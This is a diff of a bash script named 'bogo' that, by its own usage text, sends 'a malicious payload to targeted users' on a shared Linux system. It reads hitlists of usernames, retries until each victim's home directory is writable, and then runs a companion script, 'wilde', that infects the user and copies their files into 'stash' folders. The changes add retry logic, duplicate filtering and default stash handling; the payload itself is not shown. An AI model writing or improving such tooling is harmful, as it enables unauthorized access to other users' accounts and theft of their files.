@@ -1,7 +1,7 @@
 #!/bin/bash
 # Bogo
 
-header="BOGO v1.1\nProperty of Michael Talon\n"
+header="BOGO v1.2\nProperty of Michael Talon\n"
 
 # Make sure these are hardcoded to YOUR home directory
 # If you run this as root, it will treat ~ as /root
@@ -13,7 +13,12 @@ wilde=$base/wilde             # Location of wilde
 
 onfail=continue               # Set to 'retry' if you want bogo to
                               # continuously hit target if it is locked
-
+                              
+retry_delay=5                 # Seconds to wait before attempting to
+                              # breach target again if configured to
+                              # retry on fail. 
+                              # Set this between 1 and 30 seconds,
+                              # Default is 5.
 
 VarCheck(){
 	# Make sure our constants actually exist
@@ -22,6 +27,19 @@ VarCheck(){
 		Error fatal "$1 does not exist"
 	fi
 }
+
+PuppetInit(){
+	if [[ ! -e $puppets ]]; then
+		echo "No puppet file was given - using default"
+		puppets=$base/stash
+		if [[ ! -e $puppets ]]; then
+			echo "Creating $puppets"
+			mkdir $puppets
+		fi
+	fi
+	VarCheck $puppets
+}
+
 NameTargets(){
 	# Parse the filename for the target files, and extract usernames
 	# from them
@@ -71,15 +89,32 @@ Error(){
 	esac
 }
 
+ArrayHasValue(){
+	local i thing="$1"
+	shift
+	for i; do 
+		[[ "$i" == "$thing" ]] && return 0; 
+	done
+	return 1
+}
+
 ReadFile(){
 	# Confirms our puppets and targets are accessable
 	while IFS='' read -r line || [[ -n "$line" ]]; do
 		if [[ $1 == $puppets ]]; then
 			CheckPuppet $line
 		else
-			if [[ -d /home/$line ]]; then
-				targets_go[$i]=$line
-				((i++))
+			ArrayHasValue "$line" "${targets_go[@]}"
+			if [[ $? == 0 ]]; then
+				if [[ -z $z ]]; then
+					echo "Ignoring duplicates in hitlist... dammit hopps"
+					z=1
+				fi
+			else
+				if [[ -d /home/$line ]]; then
+					targets_go[$i]=$line
+					((i++))
+				fi
 			fi
 		fi
 	done < "$1"
@@ -122,60 +157,65 @@ WildeSanityCheck(){
 }
 
 Usage(){
-	echo "Usage: bogo [ACTION]"
-	echo "Where ACTION is either hit or sync-puppets"
-	echo ""
-	echo "Last edits were made July 25th"
-	echo "This script is still in development and should be considered"
-	echo "DANGEROUS. Use at your own risk"                                        
-	echo "-------------------------------------------------------------"
-	echo ""
-	echo "Bogo creates a directory ('zpd' by default) to put all its"
-	echo "related files into. You should put everything related to this"
-	echo "script in there before executing to simplify things"
-	echo ""
-	echo "Bogo needs 3 things to operate:"
-	echo "wilde        ->   Performs the attack"
-	echo ""
-	echo "puppets.bogo ->   List of directories that wilde dumps his"
-	echo "                  stash to"
-	echo ""
-	echo "targets.d    ->   Directory that contains text files that"
-	echo "                  contain the users whom Bogo should infect"
-	echo ""
-	echo "                  These files MUST be in the form of"
-	echo "                  \"targets_YourNameHere.bogo\" or Bogo"
-	echo "                  will ignore them"
-	echo ""
-	echo "                  I recommend sorting users by nation, so"
-	echo "                  for example we would create a file here"
-	echo "                  called \"targets_NorthFairfaxia.bogo\" and"
-	echo "                  in that file list the users of that nation"
-	echo ""
-	echo "puppets.bogo should contain HARDLINKS of where you want the"
-	echo "files to be stored"
-	echo ""
-	echo "NO SANITY CHECKS ARE PERFORMED ON THE CONTENTS OF THOSE FILES"
-	echo "So make sure they are valid and that there ARE NO EMPTY LINES"
-	echo ""
-	echo "Right now there are only 2 ACTIONS:"
-	echo ""
-	echo "hit --------------------------------------------------------"
-	echo "Attempts to hit victims listed in targets.bogo."
-	echo ""
-	echo "If bogo cant write to it, he waits 2 seconds and keeps retrying"
-	echo "until he can or you abort with ^C"
-	echo ""
-	echo "If bogo can write to the target, he then executes wilde who then"
-	echo "infects the user and dumps the contents of their home directory"
-	echo "into the folder(s) listed in 'puppets.bogo'"
-	echo ""
-	echo "** DO NOT invoke wilde directly - HE WILL INFECT YOU **"
-	echo ""
-	echo "sync-puppets ---------------------------------------------"
-	echo "Moves the contents of the the puppets in puppets.bogo into"
-	echo "Bogo's working directory in your home"
-	echo ""
+	echo "
+		
+	bogo [Action]
+	
+	This script is designed to send a malicious payload to targeted
+	users - EXECUTE AT YOUR OWN RISK.
+	
+	Before executing you should modify the \"base\" variable to match
+	your home directory, so that bogo knows where to put things.
+	
+	Make sure it is hard coded (ie not using ~) to the desired directory.
+	If ran as root, ~ will be treated as /root, which probably isnt what
+	you want.
+	
+	Bogo needs 2 things to operate:
+		wilde	        The script that performs the attack
+		
+		targets.d	Directory that contains text files containing
+				users whom Bogo should infect.
+											
+				These files must be in the form of
+				\"targets_YourNameHere.bogo\" or they will
+				be ignored.
+	
+	Bogo stores wilde's \"stash\" (the files he steals from user accounts)
+	into his working directory in a folder called \"stash\".
+	If you want to change this, create a file called \"puppets.bogo\"
+	containing the new paths.
+	
+	List of actions:
+	
+	sync-puppets
+	If puppets are specified in puppets.bogo, sync-puppets moves their
+	contents to Bogo's working directory in a folder called \"stash\".
+	
+	hit
+	Bogo attempts to access the users specified in the hitlist(s)
+	in targets.d
+	
+	If he can't write to it, depending on how he is configured he will 
+	either skip them, or wait a specified amount of time before trying 
+	again.
+	
+	If he can write to them, the infection process begins.
+	Bogo creates wilde's \"one time pad\": a configuration file containing
+	a list of puppets to send the stash to.
+	
+	Wilde uses this to tailor the payload to the victim without revealing 
+	the identities of the attacker or his puppets.
+	
+	Bogo then checks if wilde exists, contains no syntax errors, and his
+	configuration points to valid directories. If these are all true,
+	wilde is \"sane\", and ready for execution.
+	
+	Bogo executes wilde, and then waits for some kind of exit code.
+	If wilde returns 0, he was successful and Bogo moves to the next
+	target. Otherwise, Bogo will abort the operation.
+	
+	"
 }
 
 SyncPuppets(){
@@ -184,14 +224,21 @@ SyncPuppets(){
 	PathCheck $puppets
 	ReadFile $puppets
 	if [ ${#puppets_go[@]} -eq 0 ]; then
-		Error warn "There aren't puppets to sync!"
+		Error warn "There are not puppets to sync!"
 	else
-		echo -ne "Synchronizing stash... "
+		echo "Synchronizing stash..."
 		for j in "${puppets_go[@]}"; do
-			mv -f $j/* $base/stash
+			if [[ $j == "$base/stash" ]]; then
+				echo "Skipping $j: thats our destination!"
+			elif [[ ! -e $j ]]; then
+				echo "Skipping $j: doesn't seem to exist"
+			else
+				mv -fv $j $base/stash
+			fi
 		done
-		echo -ne "  ok\n"
+		echo -ne "\nDone\n"
 	fi
+	
 }
 
 Hit(){
@@ -213,8 +260,12 @@ Hit(){
 		if [[ ! -w /home/$k ]]; then
 			if [[ $onfail == "retry" ]]; then
 				while [[ ! -w /home/$k ]]; do
-					echo "$(date +%I-%M-%S): $k is locked - retrying in 2 seconds"
-					sleep 2
+					echo "$(date +%I-%M-%S): $k is locked - retrying in $retry_delay seconds"
+					if [[ ! $retry_delay =~ ^-?[0-9]+$ ]]; then
+						echo -ne "\n...$retry_delay is not a number *facepalm*\nRetrying in 5 seconds\n"
+						retry_delay=5
+					fi
+					sleep $retry_delay
 				done
 			else
 				echo "$k is locked, moving on"
@@ -252,9 +303,15 @@ Hit(){
 
 clear
 VarCheck $base
-VarCheck $puppets
+PuppetInit
 VarCheck $target_list
 VarCheck $wilde
+if [[ $onfail == "retry" ]]; then
+		if [ "$retry_delay" -lt 1 ] || [ "$retry_delay" -gt 30 ]; then
+			Error note "Setting retry_delay to 5. Current setting is invalid"
+			retry_delay=5
+		fi
+fi
 
 echo -ne "$header\n"
 if [[ ! -e $base ]]; then
